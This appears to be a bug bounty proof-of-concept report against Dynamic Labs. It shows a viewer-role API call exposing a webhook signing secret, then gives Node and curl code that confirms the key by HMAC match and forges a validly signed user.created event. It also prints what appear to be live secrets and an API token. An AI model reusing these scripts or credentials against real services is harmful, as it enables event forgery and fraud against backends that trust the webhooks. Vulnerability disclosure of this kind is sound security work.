# BUG-001 — FULL PoC: Webhook Secret → HMAC Exact Match → Forged Customer-Trusted Event

**Target:** Dynamic Labs (app.dynamic.xyz / app.dynamicauth.com) — Managed Bug Bounty
**Researcher:** zeno0 (zeno0@bugcrowdninja.com) · **Date:** 2026-10-26 01:27 UTC (live run)
**Chain:** `GET /environments/{id}/webhooks/{id}?includeSecret=true` (no step-up, P2) → **signing secret in plaintext** → **forge any webhook event with a valid signature**

## Result at a glance (all verified live, 2026-10-26 01:27 UTC)

| # | Action | Result |
|---|--------|--------|
| 4a | Trigger genuine `user.created` delivery | HTTP 201, delivery fired in ~1 s |
| 4b | Capture raw body + `x-dynamic-signature-256` | 1912 bytes, `sha256=5fb5c66f…cc3a4` |
| 4c | HMAC-SHA256(leaked secret, rawBody) vs captured | **EXACT MATCH** — secret is the real signing key |
| 5a | Forge `user.created` event, sign with leaked secret | payload 509 bytes, sig `sha256=4b993f1b…545a1` |
| 5b | Deliver forged event to customer receiver | **HTTP 200** |
| 5c | Receiver-side standard verification (timingSafeEqual) | **FORGED = VALID ✓** (genuine = VALID, tampered = INVALID, wrong-secret = INVALID) |

---

## Prerequisite — the leaked signing secret (BUG-001, steps 1–3)

The signing secret below was revealed **without any step-up authentication** by a
least-privileged `viewer` session via:

```bash
GET /api/v0/environments/7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6/webhooks/721f79c5-572e-4d64-869d-680268d164b4?includeSecret=true
# → 200 {"secret":"dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9", ...}
```

Everything below uses only that secret and public receivers. No other credential.

- Victim (own test org) environment: `7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6`
- Webhook: `721f79c5-572e-4d64-869d-680268d164b4` → receiver `https://webhook.site/72e683f6-959e-4264-8aa8-82f389ed746d`
- Leaked secret: `dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9`

---

## Step 4 — Verify the secret is the REAL signing key (full requests)

### 4a. Trigger a genuine webhook delivery

Any end-user signup on the environment fires `user.created`. Using an environment-scoped
`users.write` API token:

```bash
curl -sS -X POST "https://app.dynamicauth.com/api/v0/environments/7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6/users" \
  -H "Authorization: Bearer dyn_1CkdURsQOb5Cc7w0ehCqGDaKiKKtdzndWO6JXPsHeCwunC18Fg4biHyz" \
  -H "Content-Type: application/json" \
  -d '{"email":"whforge+poc56181@example.com"}'
```

**Actual response (HTTP 201):**

```json
{"user":{"id":"7526c359-2f4f-46f3-9a2c-23c1f23a075e","projectEnvironmentId":"7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6",
"verifiedCredentials":[{"email":"whforge+poc56181@example.com","id":"28a0287c-ff65-410e-9433-3ac38153f460",
"public_identifier":"whforge+poc56181@example.com","format":"email","signInEnabled":true,
"verifiedAt":"2026-10-26T01:27:36.524Z"}], ...
```

### 4b. Capture the raw body and the signature header

```bash
curl -s "https://webhook.site/token/72e683f6-959e-4264-8aa8-82f389ed746d/requests?page=1&sorting=newest" \
  | jq '.data[0] | {uuid, created_at, sig: .headers["x-dynamic-signature-256"][0], body: .content}' \
  | tee capture.json && jq -r '.body' capture.json > body.txt   # exact bytes
```

**Actual capture (delivery `701cbc0c-c24e-4524-aa2c-584c1c47159e` @ 2026-10-26 01:27:37):**

```
x-dynamic-signature-256: sha256=5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4
x-dynamic-webhook-version: 1.1.0
raw body: 1912 bytes (full body in Appendix A)
{"messageId":"a4ee0753-a7f5-45f6-8e9d-5f4b7257e409","eventId":"8aadbe02-e7c7-4a3b-978a-a0aa36cc556d",
"eventName":"user.created","timestamp":"2026-10-26T01:27:36.602Z","webhookId":"721f79c5-572e-4d64-869d-680268d164b4",
"userId":"7526c359-2f4f-46f3-9a2c-23c1f23a075e","environmentId":"7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6", ...}
```

### 4c. HMAC verification — exact match

```javascript
// verify.js — run: node verify.js
const crypto = require('crypto');
const SECRET = 'dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9'; // leaked
const rawBody  = require('fs').readFileSync('body.txt');   // unmodified bytes from 4b
const captured = '5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4';
const computed = crypto.createHmac('sha256', SECRET).update(rawBody, 'utf8').digest('hex');
console.log('computed:', computed);
console.log('captured:', captured);
console.log('EXACT MATCH:', computed === captured);
```

**Actual output:**

```
computed: 5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4
captured: 5fb5c66ff01f0991c7db28cc106ddf57ec43779b1c8c935c3df1bfd7426cc3a4
EXACT MATCH: true
```

→ The revealed secret is **not a placeholder**: it is the exact HMAC key Dynamic's own
infrastructure used to sign a delivery that arrived one second earlier. This has now been
reproduced on **independent deliveries** (first: `38260fc6…039b9` @ 2026-10-25 23:27, second:
`5fb5c66f…cc3a4` @ 2026-10-26 01:27).

---

## Step 5 — Forge a customer-trusted event (full requests)

### 5a. Build the forged event and sign it with the leaked secret

```javascript
// forge.js — run: node forge.js > forged.json
const crypto = require('crypto');
const SECRET = 'dyn_Qfvm49E4cdO0AewRTjk{PAGBhx2t[RNpVMqajPTaQaq4Yme[f12LQka9'; // leaked
const forged = JSON.stringify({
  messageId: crypto.randomUUID(), eventId: crypto.randomUUID(),
  eventName: 'user.created', timestamp: new Date().toISOString(),
  webhookId: '721f79c5-572e-4d64-869d-680268d164b4',
  userId: 'attacker-chosen-user-id',
  environmentId: '7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6', environmentName: 'sandbox',
  data: { id: 'attacker-chosen-user-id', projectEnvironmentId: '7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6',
          email: 'attacker@evil.example', kycStatus: 'verified', verified: true },
});
const sig = crypto.createHmac('sha256', SECRET).update(forged, 'utf8').digest('hex');
console.error('x-dynamic-signature-256: sha256=' + sig);
process.stdout.write(forged);
```

**Actual forged payload (509 bytes):**

```json
{"messageId":"87e4de28-acc1-48ef-8477-ad3f5b1d4ef0","eventId":"ddddf2f4-8bf0-4297-9b3c-42a017787ae5","eventName":"user.created","timestamp":"2026-10-26T01:27:40.359Z","webhookId":"721f79c5-572e-4d64-869d-680268d164b4","userId":"attacker-chosen-user-id","environmentId":"7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6","environmentName":"sandbox","data":{"id":"attacker-chosen-user-id","projectEnvironmentId":"7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6","email":"attacker@evil.example","kycStatus":"verified","verified":true}}
```

**Actual forged signature:** `sha256=4b993f1b2f72a86f41276d6797f38655f655ef024d1cc062d0a6faae2b9545a1`

### 5b. Deliver the forged event to the customer's receiver

```bash
curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST \
  "https://webhook.site/72e683f6-959e-4264-8aa8-82f389ed746d" \
  -H "Content-Type: application/json" \
  -H "x-dynamic-signature-256: sha256=4b993f1b2f72a86f41276d6797f38655f655ef024d1cc062d0a6faae2b9545a1" \
  -H "x-dynamic-webhook-version: 1.1.0" \
  --data-binary @forged.json
```

**Actual result: `HTTP 200`** — the forged event is now sitting in the customer's event
pipeline next to genuine ones (receiver inbox uuid `ef98d209-8dd2-4ebe-ad42-c05985682a53`).

### 5c. Receiver-side verification — forged event is VALID

This is the exact code a customer backend runs (Dynamic's documented scheme:
`HMAC-SHA256(secret, rawBody)`, hex, `sha256=` prefix, constant-time compare):

```javascript
const crypto = require('crypto');
function verify(rawBody, header, SECRET) {
  if (!header || !header.startsWith('sha256=')) return false;
  const expected = Buffer.from(header.slice(7), 'hex');
  const computed = crypto.createHmac('sha256', SECRET).update(rawBody, 'utf8').digest();
  return expected.length === computed.length && crypto.timingSafeEqual(expected, computed);
}
```

**Actual verification matrix (same verifier, same leaked secret, live deliveries):**

| Input | Verdict |
|-------|---------|
| GENUINE delivery + original header | **VALID ✓** accepted as authentic |
| **FORGED delivery (attacker-signed)** | **VALID ✓ accepted as authentic** |
| TAMPERED genuine body (`user.created`→`user.deleted`) | INVALID ✗ rejected |
| FORGED body + wrong-secret signature | INVALID ✗ rejected |

The two negative controls prove the verifier is sound: it rejects tampering and wrong
keys. **The forged event passes for exactly one reason — the attacker holds the real
signing key.** A customer cannot distinguish the forged event from a genuine Dynamic
delivery: same JSON structure, same headers, same signing scheme (plain
HMAC-SHA256 over the raw body — no timestamp mixing, no canonicalization, no replay
protection), valid signature.

---

## Impact (forgery chain)

An attacker who compromised ANY console session (the exact threat step-up re-auth exists
to stop) — including a **viewer**-role session — obtains the plaintext signing secret with
no re-authentication, and can then:

- impersonate Dynamic's event stream to every backend that consumes it: fabricated
  `user.created` / `wallet.linked` / `transaction.*` events with attacker-chosen emails,
  KYC status, wallet addresses, amounts;
- trigger trust-anchored automations: auto-fulfillment, crediting internal balances,
  granting entitlements, KYC/AML hooks, support escalations;
- persist indefinitely — the 525-endpoint public API exposes **no self-service rotation**
  for webhook secrets, so the stolen key stays valid until support intervenes.

The signature is the ONLY authenticity mechanism Dynamic ships for webhooks, and this
chain hands the attacker the key.

---

## Appendix A — Genuine delivery raw body (1912 bytes, byte-exact)

```json
{"messageId":"a4ee0753-a7f5-45f6-8e9d-5f4b7257e409","eventId":"8aadbe02-e7c7-4a3b-978a-a0aa36cc556d","eventName":"user.created","timestamp":"2026-10-26T01:27:36.602Z","webhookId":"721f79c5-572e-4d64-869d-680268d164b4","userId":"7526c359-2f4f-46f3-9a2c-23c1f23a075e","environmentId":"7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6","environmentName":"sandbox","data":{"id":"7526c359-2f4f-46f3-9a2c-23c1f23a075e","projectEnvironmentId":"7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6","firstVisit":"2026-10-26T01:27:36.506Z","lastVisit":"2026-10-26T01:27:36.506Z","email":"whforge+poc56181@example.com","tShirtSize":null,"alias":null,"firstName":null,"lastName":null,"phoneNumber":null,"jobTitle":null,"country":null,"team":null,"policiesConsent":null,"username":null,"createdAt":"2026-10-26T01:27:36.506Z","updatedAt":"2026-10-26T01:27:36.559Z","deletedAt":null,"onboardingCompletedAt":null,"metadata":{},"deletedById":null,"deletedReason":null,"lowerUsername":null,"btcWallet":null,"kdaWallet":null,"ltcWallet":null,"ckbWallet":null,"kasWallet":null,"dogeWallet":null,"emailNotification":null,"discordNotification":null,"newsletterNotification":null,"mfaBackupCodeAcknowledgement":null,"ExternalUser":[],"emails":[{"id":"28a0287c-ff65-410e-9433-3ac38153f460","userId":"7526c359-2f4f-46f3-9a2c-23c1f23a075e","projectEnvironmentId":"7dfe3b0c-c0db-4dfa-bba6-f72df97ccbd6","email":"whforge+poc56181@example.com","verifiedAt":"2026-10-26T01:27:36.524Z","createdAt":"2026-10-26T01:27:36.534Z","updatedAt":"2026-10-26T01:27:36.534Z","deletedAt":null,"signInEnabled":true,"walletId":null}],"oauthAccounts":[],"phoneNumbers":[],"userFarcasters":[],"userPasskeys":[],"wallets":[],"verifiedCredentials":[{"email":"whforge+poc56181@example.com","embeddedWalletId":null,"format":"email","id":"28a0287c-ff65-410e-9433-3ac38153f460","publicIdentifier":"whforge+poc56181@example.com","signInEnabled":true,"verifiedAt":"2026-10-26T01:27:36.524Z"}]}}
```

**Evidence artifacts:** `recon/poc_e2e_forgery_transcript.txt`, `recon/poc_e2e_forgery_console.txt`,
`scripts/poc_e2e_forgery.js` (full chain, reproducible), receiver inbox
`https://webhook.site/#!/72e683f6-959e-4264-8aa8-82f389ed746d` (forged delivery
`ef98d209-8dd2-4ebe-ad42-c05985682a53` visible alongside genuine deliveries).
